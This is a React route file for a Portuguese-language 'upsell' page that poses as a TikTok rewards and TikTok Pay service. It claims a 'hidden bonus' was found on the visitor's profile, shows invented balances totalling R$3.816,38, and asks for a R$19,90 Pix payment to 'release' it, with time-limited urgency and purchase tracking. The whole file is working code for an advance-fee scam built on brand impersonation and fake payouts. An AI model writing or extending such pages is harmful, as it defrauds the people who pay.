import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { trackEvent } from "@/lib/tracking";
import { PixCheckoutModal } from "@/components/PixCheckoutModal";



export const Route = createFileRoute("/upsell-5")({
  head: () => ({
    meta: [
      { title: "Bônus Oculto Encontrado | TikTok Recompensas" },
      {
        name: "description",
        content:
          "Encontramos um bônus oculto de R$1.247,63 vinculado ao seu perfil. Total a receber: R$3.816,38.",
      },
      { property: "og:title", content: "Bônus Oculto Encontrado | TikTok Recompensas" },
      { property: "og:description", content: "Total a receber: R$3.816,38." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: Upsell5,
});

function Upsell5() {
  const [pixOpen, setPixOpen] = useState(false);
  useEffect(() => {

    trackEvent("ViewContent", { content_name: "Upsell 5", currency: "BRL", value: 3816.38 });
  }, []);

  return (
    <div className="flex min-h-screen items-center justify-center bg-muted/40 px-4 py-10">

      <section className="w-full max-w-md rounded-2xl bg-background p-6 text-center shadow-sm">
        <h1 className="text-2xl font-bold text-foreground">
          Parabéns! Bônus Oculto Encontrado
        </h1>
        <p className="mt-3 text-sm text-muted-foreground">
          Nosso sistema encontrou um valor adicional vinculado ao seu perfil.
        </p>

        <div className="mt-6 rounded-xl bg-emerald-50 p-5">
          <p className="text-xs font-semibold uppercase tracking-wide text-muted-foreground">
            Valor do bônus
          </p>
          <p className="mt-1 text-3xl font-extrabold text-emerald-700">R$1.247,63</p>
        </div>

        <dl className="mt-6 space-y-3 text-sm">
          <div className="flex justify-between border-b border-border pb-2">
            <dt className="text-muted-foreground">Saldo anterior</dt>
            <dd className="font-semibold text-foreground">R$2.568,75</dd>
          </div>
          <div className="flex justify-between border-b border-border pb-2">
            <dt className="text-muted-foreground">Bônus oculto</dt>
            <dd className="font-semibold text-emerald-600">+ R$1.247,63</dd>
          </div>
          <div className="flex justify-between">
            <dt className="font-semibold text-foreground">Total a receber</dt>
            <dd className="text-lg font-extrabold text-foreground">R$3.816,38</dd>
          </div>
        </dl>

        <ul className="mt-6 space-y-2 text-left text-sm text-muted-foreground">
          <li>✓ Valor extra identificado após todas as validações</li>
          <li>✓ Será creditado junto com o seu pagamento</li>
          <li>✓ Liberação imediata após a confirmação do pagamento</li>
        </ul>

        <button
          type="button"
          onClick={() => {
            trackEvent("AddToCart", { content_name: "Upsell 5", currency: "BRL", value: 19.9 });
            setPixOpen(true);
          }}
          className="mt-6 block w-full rounded-xl bg-rose-600 px-4 py-4 text-base font-bold text-white transition-colors hover:bg-rose-700"
        >
          LIBERAR MEU BÔNUS AGORA
        </button>

        <PixCheckoutModal
          open={pixOpen}
          onClose={() => setPixOpen(false)}
          amount={19.9}
          title="Liberação do Bônus Oculto"
          nextRoute="/obrigado"
          prefillName="Cliente"
          prefillEmail={`cliente+up5${Date.now()}@email.com`}
        />


        <p className="mt-4 text-[11px] text-muted-foreground">
          TikTok Pay • Esta oferta está disponível por tempo limitado.
        </p>
      </section>
    </div>
  );
}
